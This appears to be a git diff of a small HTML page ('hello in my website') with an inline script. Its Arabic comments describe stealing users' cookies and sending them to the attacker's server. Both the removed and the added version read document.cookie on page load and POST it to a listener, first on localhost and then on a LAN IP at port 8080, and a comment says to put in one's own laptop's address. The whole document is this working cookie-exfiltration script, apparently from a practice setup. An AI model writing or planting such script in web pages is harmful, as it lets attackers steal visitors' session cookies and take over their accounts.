@@ -6,16 +6,17 @@
     <body>
        <h1>hello in my website</h1>
 
-       <script>
-        // سرقة الكوكيز من المستخدم
-        var stolenCookies = document.cookie;
+      <script>
+        // جمع الكوكيز أو أي بيانات حساسة
+        var stolenData = document.cookie;
       
-        // إرسال الكوكيز إلى خادم المهاجم
+        // إنشاء طلب POST لإرسال البيانات إلى الخادم المحلي
         var xhr = new XMLHttpRequest();
-        xhr.open("POST", "http://localhost:8080", true);
+        xhr.open("POST", "http://<IP-192.168.1.6>:8080                 ", true); // استبدل <IP-الكمبيوتر-الخاص-بك> بعنوان IP الخاص بجهاز اللابتوب
         xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.send("cookies=" + encodeURIComponent(stolenCookies));
+        xhr.send("data=" + encodeURIComponent(stolenData));
       </script>
+      
       
 
 
